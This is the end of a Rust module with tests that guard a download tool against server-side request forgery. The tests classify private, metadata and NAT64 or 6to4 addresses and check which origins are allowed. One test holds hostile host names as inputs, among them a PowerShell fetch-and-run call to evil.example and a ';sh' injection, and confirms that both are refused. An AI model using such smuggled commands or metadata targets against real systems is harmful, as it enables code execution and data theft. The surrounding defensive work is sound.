                    .or_else(|| nat64(ip))
                    .or_else(|| six_to_four(ip))
                    .is_some_and(|mapped| is_metadata(IpAddr::V4(mapped)))
        }
    }
}

// IPv6 documentation classification is still unstable in std
fn documentation(ip: Ipv6Addr) -> bool {
    let [first, second, ..] = ip.segments();
    (first == 0x2001 && second == 0x0db8) || (first == 0x3fff && second & 0xf000 == 0)
}

/// whether `ip` sits in `fec0::/10`, the site-local addresses IPv6 gave up but some networks
/// still route.
fn site_local(ip: Ipv6Addr) -> bool {
    ip.segments()[0] & 0xffc0 == 0xfec0
}

/// the IPv4 address a 6to4 address in `2002::/16` carries in its next 32 bits.
fn six_to_four(ip: Ipv6Addr) -> Option<Ipv4Addr> {
    let [_, _, a, b, c, d, ..] = ip.octets();
    (ip.segments()[0] == 0x2002).then(|| Ipv4Addr::new(a, b, c, d))
}

/// the IPv4 address a NAT64 translator on the well-known prefix `64:ff9b::/96` reaches for `ip`.
fn nat64(ip: Ipv6Addr) -> Option<Ipv4Addr> {
    let [.., a, b, c, d] = ip.octets();
    (ip.segments()[..6] == [0x64, 0xff9b, 0, 0, 0, 0]).then(|| Ipv4Addr::new(a, b, c, d))
}

/// whether `ip` sits in the local-use NAT64 prefix `64:ff9b:1::/48`, where each network places the
/// IPv4 address itself, so every address there counts as private.
fn local_nat64(ip: Ipv6Addr) -> bool {
    ip.segments()[..3] == [0x64, 0xff9b, 1]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ip(text: &str) -> IpAddr {
        text.parse().unwrap()
    }

    /// only a route out through an interface other than loopback shows a network, as one on a
    /// lab's own network alone does; a machine whose interfaces are down or show nothing but
    /// ipv6's own link-local and multicast routes has none. a table that could not be read, or
    /// reads as no table, may hold the route, so without a route in the other it tells nothing.
    #[test]
    fn a_route_out_shows_a_network_and_only_both_tables_read_show_none() {
        const FOUR: &str =
            "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n";
        let four = |routes: &str| format!("{FOUR}{routes}");
        let six = "00000000000000000000000000000001 80 00000000000000000000000000000000 00 00000000000000000000000000000000 00000000 00000002 00000000 80200001       lo\n\
            00000000000000000000000000000000 00 00000000000000000000000000000000 00 00000000000000000000000000000000 ffffffff 00000001 00000000 00200200       lo\n\
            fe800000000000000000000000000000 40 00000000000000000000000000000000 00 00000000000000000000000000000000 00000100 00000001 00000000 00000001     eth0\n\
            ff000000000000000000000000000000 08 00000000000000000000000000000000 00 00000000000000000000000000000000 00000100 00000002 00000000 00000001     eth0\n";
        let global = format!(
            "{six}20010db8000000000000000000000000 40 00000000000000000000000000000000 00 00000000000000000000000000000000 00000100 00000001 00000000 00000001     eth0\n"
        );
        let lan = four("eth0\t0000000A\t00000000\t0001\t0\t0\t0\t000000FF\t0\t0\t0\n");
        let default = four("eth0\t00000000\t0101A8C0\t0003\t0\t0\t100\t00000000\t0\t0\t0\n");
        let rejected = four("eth0\t0000000A\t00000000\t0201\t0\t0\t0\t000000FF\t0\t0\t0\n");
        let down = four("eth0\t0000000A\t00000000\t0000\t0\t0\t0\t000000FF\t0\t0\t0\n");
        let looped = four("lo\t0000007F\t00000000\t0001\t0\t0\t0\t000000FF\t0\t0\t0\n");
        let none = four("");
        for (four, six, routed) in [
            (Some(none.as_str()), Some(""), Some(false)),
            (Some(none.as_str()), Some(six), Some(false)),
            (Some(rejected.as_str()), Some(six), Some(false)),
            (Some(down.as_str()), Some(six), Some(false)),
            (Some(looped.as_str()), Some(""), Some(false)),
            (Some(lan.as_str()), Some(""), Some(true)),
            (Some(default.as_str()), Some(six), Some(true)),
            (Some(none.as_str()), Some(global.as_str()), Some(true)),
            // a table this machine could not read
            (Some(none.as_str()), None, None),
            (None, Some(six), None),
            (None, None, None),
            (Some(lan.as_str()), None, Some(true)),
            (None, Some(global.as_str()), Some(true)),
            // a file that reads as no ipv4 table at all
            (Some(""), Some(six), None),
        ] {
            assert_eq!(routed_by(four, six), routed, "{four:?} {six:?}");
        }
    }

    #[test]
    fn a_name_nobody_knows_is_told_apart_from_a_dns_hiccup() {
        if cfg!(windows) {
            assert!(is_unknown(&std::io::Error::from_raw_os_error(11001)));
            assert!(!is_unknown(&std::io::Error::from_raw_os_error(11002)));
        } else {
            let said = |text: &str| {
                std::io::Error::other(format!("failed to lookup address information: {text}"))
            };
            assert!(is_unknown(&said("Name or service not known")));
            assert!(is_unknown(&said("Name does not resolve")));
            assert!(is_unknown(&said(
                "nodename nor servname provided, or not known"
            )));
            assert!(!is_unknown(&said("Temporary failure in name resolution")));
            assert!(!is_unknown(&said("Try again")));
        }
    }

    /// the private rows cover each range a request could reach a local or metadata host by,
    /// ipv4 carried in ipv6 included; the public rows sit just outside them.
    #[test]
    fn reserved_and_metadata_ranges_are_private_and_the_rest_public() {
        for text in [
            "10.1.2.3",
            "172.16.0.1",
            "192.168.1.1",
            "127.0.0.1",
            "169.254.169.254",
            "100.64.0.1",
            "0.0.0.0",
            "::1",
            "fc00::1",
            "fe80::1",
            "::ffff:169.254.169.254",
            // oracle cloud's instance metadata lives at 192.0.0.192
            "192.0.0.192",
            "0.1.2.3",
            "240.0.0.1",
            "255.255.255.254",
            "::169.254.169.254",
            "::10.0.0.1",
            "2002:a9fe:a9fe::1",
            "2002:c000:c0::1",
            "fec0::1",
            "feff::1",
        ] {
            assert!(is_private(ip(text)), "{text} is private");
        }
        for text in [
            "8.8.8.8",
            "188.184.98.157",
            "2001:4860:4860::8888",
            "100.128.0.1",
            "192.0.1.1",
            // clash and mihomo answer every name with a fake address from 198.18.0.0/15
            "198.18.0.1",
            "2002:808:808::1",
        ] {
            assert!(!is_private(ip(text)), "{text} is public");
        }
    }

    #[test]
    fn a_nat64_address_is_judged_by_the_ipv4_address_it_reaches() {
        for text in [
            "64:ff9b::169.254.169.254",
            "64:ff9b::a9fe:a9fe",
            "64:ff9b::10.0.0.1",
            "64:ff9b::127.0.0.1",
            "64:ff9b:1::192.168.1.1",
            // a local-use prefix can place the IPv4 address elsewhere, as at 169.254.169.254 here
            "64:ff9b:1:a9fe:a9:fe00:808:808",
            "64:ff9b:1::188.184.98.157",
        ] {
            assert!(is_private(ip(text)), "{text} is private");
        }
        for text in ["64:ff9b::8.8.8.8", "64:ff9b::188.184.98.157"] {
            assert!(!is_private(ip(text)), "{text} is public");
        }
    }

    #[test]
    fn a_private_literal_needs_to_have_been_typed() {
        let typed = Typed::default();
        let metadata = Url::parse("http://169.254.169.254/latest").unwrap();
        assert!(typed.check(&metadata).is_err());
        typed.add(&metadata);
        assert!(typed.check(&metadata).is_ok());
        assert!(
            typed
                .check(&Url::parse("https://zenodo.org/x").unwrap())
                .is_ok()
        );
    }

    #[test]
    fn a_proxy_may_be_reached_but_never_requested() {
        let typed = Typed::default();
        typed.add_proxy("127.0.0.1");
        typed.add_proxy("proxy.lab");
        for url in ["http://127.0.0.1:9000/admin", "http://proxy.lab:9000/admin"] {
            let url = Url::parse(url).unwrap();
            assert!(typed.check(&url).is_err(), "{url}");
        }
        for reach in [Reach::Trusted, Reach::Public] {
            assert!(typed.may_resolve_privately("proxy.lab", reach));
            assert!(!typed.may_resolve_privately("elsewhere.lab", reach));
        }
        typed.add(&Url::parse("http://proxy.lab:9000/x").unwrap());
        assert!(
            typed
                .check(&Url::parse("http://proxy.lab:9000/y").unwrap())
                .is_ok(),
            "unless a person typed its origin"
        );
    }

    /// the host's other origins go by the other client and cannot reach this machine's network.
    #[test]
    fn a_trusted_name_resolves_privately_for_the_trusted_client_alone() {
        let typed = Typed::default();
        typed.add(&Url::parse("http://LAB.local:8080/a.zip").unwrap());
        assert!(typed.may_resolve_privately("lab.local", Reach::Trusted));
        assert!(!typed.may_resolve_privately("lab.local", Reach::Public));
        assert!(!typed.may_resolve_privately("other.local", Reach::Trusted));
        let on = |host| typed.refused(String::new(), host, None).trusted_on_host;
        assert_eq!(on("Lab.Local"), ["http://lab.local:8080"]);
        assert_eq!(on("other.local"), Vec::<String>::new());
    }

    /// the refusal gives the `settings set` command with what the setting lists already and the
    /// variable for one run, or the variable alone while it sets the list, since it then wins. the
    /// variable is written as the shell there sets it: before the command in bash, zsh and fish,
    /// where a line of its own would set it for no command, and with `$env:` in powershell.
    #[test]
    fn a_refusal_quotes_the_whole_setting_that_lifts_it() {
        let origin = Url::parse("http://10.0.0.5:9001/a.zip").unwrap().origin();
        let lab = Url::parse("http://lab.local:8080").unwrap().origin();
        let remedy = |origins: Vec<url::Origin>, by_variable, windows| {
            Allowed {
                origins,
                by_variable,
            }
            .remedy_for(&origin, windows)
        };
        assert_eq!(
            remedy(Vec::new(), false, false),
            "save it with `fetchloom settings set allowed_origins http://10.0.0.5:9001`, or put `FETCHLOOM_ALLOWED_ORIGINS=http://10.0.0.5:9001` before the command for that run alone"
        );
        assert_eq!(
            remedy(vec![lab.clone()], false, false),
            "save it with `fetchloom settings set allowed_origins http://lab.local:8080 http://10.0.0.5:9001`, or put `FETCHLOOM_ALLOWED_ORIGINS=http://lab.local:8080,http://10.0.0.5:9001` before the command for that run alone"
        );
        assert_eq!(
            remedy(vec![lab.clone()], true, false),
            "put `FETCHLOOM_ALLOWED_ORIGINS=http://lab.local:8080,http://10.0.0.5:9001` before the command"
        );
        assert_eq!(
            remedy(vec![lab.clone()], false, true),
            "save it with `fetchloom settings set allowed_origins http://lab.local:8080 http://10.0.0.5:9001`, or run `$env:FETCHLOOM_ALLOWED_ORIGINS = 'http://lab.local:8080,http://10.0.0.5:9001'` first for this terminal alone"
        );
        assert_eq!(
            remedy(vec![lab], true, true),
            "run `$env:FETCHLOOM_ALLOWED_ORIGINS = 'http://lab.local:8080,http://10.0.0.5:9001'` first"
        );
        // a word a shell would read as more than a word is quoted, wherever it came from
        let odd = Url::parse("http://lab;sh.example/").unwrap().origin();
        assert_eq!(
            Allowed::default().remedy_for(&odd, false),
            "save it with `fetchloom settings set allowed_origins \"http://lab;sh.example\"`, or put `FETCHLOOM_ALLOWED_ORIGINS=\"http://lab;sh.example\"` before the command for that run alone"
        );
    }

    /// what a person pastes reads back as the variable and its value: bash, zsh and fish run the
    /// command with it set, as the help says, and set nothing for later commands.
    #[cfg(unix)]
    #[test]
    fn the_variable_the_help_writes_sets_it_for_that_command() {
        let origin = Url::parse("http://lab;sh.example/").unwrap().origin();
        let help = Allowed::default().remedy_for(&origin, false);
        let prefix = help
            .split_once("put `")
            .and_then(|(_, rest)| rest.split_once('`'))
            .map(|(prefix, _)| prefix)
            .unwrap_or_default();
        let line = format!("{prefix} printenv FETCHLOOM_ALLOWED_ORIGINS");
        for shell in [
            &["bash", "--norc", "--noprofile", "-c"][..],
            &["sh", "-c"],
            &["zsh", "-f", "-c"],
            &["fish", "--no-config", "-c"],
        ] {
            let Ok(ran) = std::process::Command::new(shell[0])
                .args(&shell[1..])
                .arg(&line)
                .env_remove("FETCHLOOM_ALLOWED_ORIGINS")
                .output()
            else {
                crate::test_skips::skip(shell[0], &format!("{} cannot start", shell[0]));
                continue;
            };
            assert_eq!(
                String::from_utf8_lossy(&ran.stdout),
                "http://lab;sh.example\n",
                "{}: {line}",
                shell[0]
            );
        }
    }

    /// a host whose name holds what a shell would run, which the url crate lets through, is
    /// refused before any request, typed or not, and its refusal suggests no command to paste.
    #[test]
    fn a_host_name_a_shell_would_run_is_refused_and_suggests_no_command() {
        let typed = Typed::default();
        for link in [
            "http://data;sh*;.lab.example/x.csv",
            "http://x$(iex(irm('evil.example'))).example/x.csv",
        ] {
            let url = Url::parse(link).unwrap();
            typed.add(&url);
            let reason = typed.check(&url).expect_err(link);
            let error = super::super::failure::refused(&url, &reason);
            let help = error.help.as_deref().unwrap_or_default();
            assert!(!help.contains('`'), "{link}: {help}");
            assert_eq!(error.kind, crate::error::Kind::NetworkRefused, "{link}");
        }
        assert!(
            typed
                .check(&Url::parse("https://cdn_1.data-lab.example/a.csv").unwrap())
                .is_ok()
        );
    }

    /// another port or scheme of the host is a url nobody typed: a private address written out is
    /// refused at once, and a name is left to the addresses it resolves to.
    #[test]
    fn a_trusted_origin_trusts_nothing_else_on_its_host() {
        let typed = Typed::default();
        typed.allow([Url::parse("http://lab.local:8080").unwrap().origin()]);
        typed.add(&Url::parse("http://10.0.0.5:9000/fetchloom/").unwrap());
        typed.add(&Url::parse("https://[fd00::5]:8443/data/a.zip").unwrap());
        for (url, trusted, checked) in [
            ("http://lab.local:8080/shards/a.zip", true, true),
            ("http://LAB.local:8080/a.zip", true, true),
            ("http://lab.local:9090/a.zip", false, true),
            ("https://lab.local:8080/a.zip", false, true),
            ("http://lab.local/a.zip", false, true),
            ("http://10.0.0.5:9000/fetchloom/objects/ab/cd", true, true),
            ("http://10.0.0.5:9001/a.zip", false, false),
            ("https://10.0.0.5:9000/a.zip", false, false),
            ("https://[fd00::5]:8443/b.zip", true, true),
            ("https://[fd00::5]/b.zip", false, false),
            ("http://10.0.0.1/a.zip", false, false),
            ("https://zenodo.org/a.zip", false, true),
        ] {
            let url = Url::parse(url).unwrap();
            assert_eq!(typed.trusts(&url), trusted, "{url}");
            let checked_url = typed.check(&url);
            assert_eq!(checked_url.is_ok(), checked, "{url}: {checked_url:?}");
        }
        let refused = |url: &str| typed.check(&Url::parse(url).unwrap()).unwrap_err();
        assert_eq!(
            refused("http://10.0.0.5:9001/a.zip").trusted_on_host,
            ["http://10.0.0.5:9000"]
        );
        assert_eq!(
            refused("https://[fd00::5]/b.zip").trusted_on_host,
            ["https://[fd00::5]:8443"]
        );
        assert_eq!(
            refused("http://10.0.0.1/a.zip").trusted_on_host,
            Vec::<String>::new()
        );
    }
}

#[cfg(test)]
mod classification;
